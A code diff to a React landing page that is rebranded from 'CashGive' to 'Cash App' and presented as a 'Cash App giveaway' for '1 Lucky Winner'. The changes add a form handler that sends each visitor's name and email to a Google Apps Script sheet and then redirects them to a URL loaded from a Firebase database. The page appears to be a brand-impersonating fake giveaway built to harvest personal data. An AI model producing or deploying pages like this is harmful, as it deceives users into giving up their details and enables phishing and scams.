@@ -3,6 +3,7 @@ import './Home.css';
 
 const API_URL = "https://httpangular-d0229-default-rtdb.asia-southeast1.firebasedatabase.app/url.json";
 const API_IMAGE_URL = "https://httpangular-d0229-default-rtdb.asia-southeast1.firebasedatabase.app/img.json";
+const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbw4ePqNPTCsrmVfX8_w_LxclShzg4sAOVcGVnL4AsUjxItnETChIRPdCJ-TSEidOFsq/exec"
 function Home() {
 
     const [redirectUrl, setRedirectUrl] = useState('');
@@ -38,11 +39,20 @@ function Home() {
     const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
     const [name, setName] = useState('');
     const [email, setEmail] = useState('');
+    const [isLoading, setIsLoaing] = useState(false)
 
     const handleFormSubmit = (e) => {
         e.preventDefault();
         console.log('Registration submitted:', { name, email });
-        redirect();
+        setIsLoaing(true);
+        fetch(GOOGLE_SHEET_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: (`Name=${name}&Email=${email}`)
+        }).then(res => res.text()).then(data => {
+            redirect();
+        }).catch(error => console.log(error))
+            .finally(() => setIsLoaing(false));
     };
 
     const navItems = [
@@ -206,9 +216,13 @@ function Home() {
 
             {/* Header / Navbar */}
             <header className="navbar">
-                <a href="#home" className="nav-brand">
-                    <div className="nav-logo-icon">$</div>
-                    <span className="nav-logo-text">Cash<span>Give</span></span>
+                <a href="#home" className="nav-brand-stacked">
+
+                    <div className="logo-line-2">
+                        <div className="nav-logo-icon">$</div>
+                        <span>Cash App</span>
+                    </div>
+
                 </a>
 
                 <ul className="nav-menu">
@@ -326,8 +340,8 @@ function Home() {
                                 </div>
                             </div>
                             <div className="hero-form-actions">
-                                <button type="submit" className="btn btn-primary btn-large">
-                                    Sign Up & Enter Now
+                                <button type="submit" className="btn btn-primary btn-large" disabled={isLoading}>
+                                    {isLoading ? 'Loading...' : 'Sign Up & Enter Now'}
                                     <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                                     </svg>
@@ -373,7 +387,7 @@ function Home() {
                                     <div className="card-subtext">CASH APP</div>
                                     <div className="card-title">GIVEAWAY</div>
                                 </div>
-                                <div className="card-prize">$750</div>
+                                <div className="card-prize">subscribe now</div>
                                 <div className="card-badge">CASH</div>
                             </div>
                         </div>
@@ -385,7 +399,7 @@ function Home() {
 
                         {/* Lucky Winner Circular Sticker */}
                         <div className="winner-badge">
-                            <div className="winner-badge-value">$750</div>
+                            {/* <div className="winner-badge-value">$750</div> */}
                             <div className="winner-badge-label">To 1 Lucky Winner!</div>
                         </div>
 
